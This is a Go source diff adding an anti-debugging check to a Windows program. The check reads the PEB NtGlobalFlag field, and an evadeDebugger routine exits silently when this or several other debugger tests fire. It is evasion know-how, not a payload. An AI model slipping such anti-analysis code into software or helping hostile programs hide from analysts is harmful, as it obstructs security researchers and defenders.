@@ -106,6 +106,20 @@ func ntQueryDebugPort() bool {
 	return r1 == 0 && debugPort != 0
 }
 
+// ntGlobalFlagCheck reads PEB.NtGlobalFlag — set to 0x70 by the Windows loader
+// when the process was created under a debugger (via CREATE_PROCESS_DEBUG_EVENT).
+// Bit mask 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK |
+// FLG_HEAP_VALIDATE_PARAMETERS.
+// PEB+0xBC is the NtGlobalFlag field on x64 Windows 10+.
+func ntGlobalFlagCheck() bool {
+	peb := getPEB()
+	if peb == 0 {
+		return false
+	}
+	ntGlobalFlag := *(*uint32)(unsafe.Pointer(peb + 0xBC))
+	return (ntGlobalFlag & 0x70) == 0x70
+}
+
 // ntQueryNoDebugInherit checks ProcessDebugFlags (class 0x1F): returns 0 when
 // the process was created with DEBUG_ONLY_THIS_PROCESS / inherits a debugger.
 func ntQueryNoDebugInherit() bool {
@@ -138,7 +152,8 @@ func evadeDebugger() {
 		timingCheck() ||
 		rdtscTimingCheck() ||
 		ntQueryDebugPort() ||
-		ntQueryNoDebugInherit() {
+		ntQueryNoDebugInherit() ||
+		ntGlobalFlagCheck() {
 		os.Exit(0)
 	}
 }
